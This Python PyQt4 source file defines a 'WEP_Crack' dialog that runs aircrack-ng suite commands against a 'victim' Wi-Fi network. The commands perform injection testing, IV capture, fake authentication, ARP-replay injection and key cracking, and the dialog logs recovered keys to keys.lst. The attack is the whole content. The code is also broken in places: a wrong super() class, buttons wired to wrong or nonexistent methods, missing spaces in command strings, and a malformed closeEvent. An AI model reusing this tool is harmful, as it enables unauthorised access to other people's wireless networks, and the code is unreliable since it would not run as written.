import time

from system_functions import *
from PyQt4 import QtGui, QtCore
from PyQt4.QtCore import *
from PyQt4.QtGui import *

class WEP_Crack(QDialog):
    def __init__(self,victim,device_mac, parent=None):
        self.bssid = victim[1]
        self.victim = victim
        self.essid = victim[0]
        self.channel = victim[2]
        self.host_mac = device_mac
        super(Client, self).__init__(parent)
        self.setFixedSize(350, 300)

        self.ti = QPushButton()
        self.ti.setObjectName("wep_test_inject")
        self.ti.setText("Check WEP Injection") 

        self.si = QPushButton()
        self.si.setObjectName("start_wep_injection")
        self.si.setText("Start Airodump Capture")

        self.fa = QPushButton()
        self.fa.setObjectName("fake_auth")
        self.fa.setText("Start Fake Authentication")

        self.ca = QPushButton()
        self.ca.setObjectName("capture_packers")
        self.ca.setText("Capture packets")

        self.ck = QPushButton()
        self.ck.setObjectName("crack_key")
        self.ck.setText("Crack the Key")

        layout = QFormLayout()
        layout.addWidget(self.ti)
        layout.addWidget(self.si)
        layout.addWidget(self.fa)
        layout.addWidget(self.ca)
        layout.addWidget(self.ck)

        self.setLayout(layout)
        self.ti.clicked.connect(self.test_inject)
        self.si.clicked.connect(self.wpe_airodump_capture)
        self.fa.clicked.connect(self.fake_authentication)
        self.ca.clicked.connect(self.start_airodump_capture)
        self.ck.clicked.connect(self.crack_wpe_key)
        self.setWindowTitle("Learning")



    def test_inject(self):
        injection_test = 'aireplay-ng -9 -e ' + self.essid + ' -a ' + self.bssid + '--ignore-negative-one mon0'
        ct = Command_thread(str(injection_test))
        ct.start()

    def start_airodump_capture(self):
        airodump_capture = 'airodump-ng -c ' + self.channel + ' --bssid ' + self.bssid + ' --ivs -w output mon0'
        ct = Command_thread(str(airodump_capture))
        ct.start()

    def fake_authentication(self):
        fake_auth = 'aireplay-ng -1 6000 -o 1 -q 10 -e ' + self.essid + ' -a ' + self.bssid + ' -h ' + self.host_mac + ' mon0'
        ct = Command_thread(str(fake_auth))
        ct.start()

    def capture_wpe_packers(self):
        capture_ivs = 'aireplay-ng -3 -b ' + self.bssid + ' -h ' + self.host_mac + ' mon0'
        ct = Command_thread(str(capture_ivs))
        ct.start()


    def crack_wpe_key(self):
        fake_auth = 'aircrack-ng -b ' + self.bssid + '-l key.txt output*.cap'
        ct = Command_thread(fake_auth)
        ct.start()

    def closeEvent():
        thr = RetardedKill("airodump-ng", 0)
        thr.start()
        if os.path.isfile('key.txt'):
            content = str()
            with open('key.txt', 'r') as fo:
                content = fo.readline()
            with open('keys.lst', 'a') as fw:
                fw.write(self.bssid + '|' + content)
            commands.getstatusoutput('rm key.txt')
        self.victim[:] = []
        event.accept()

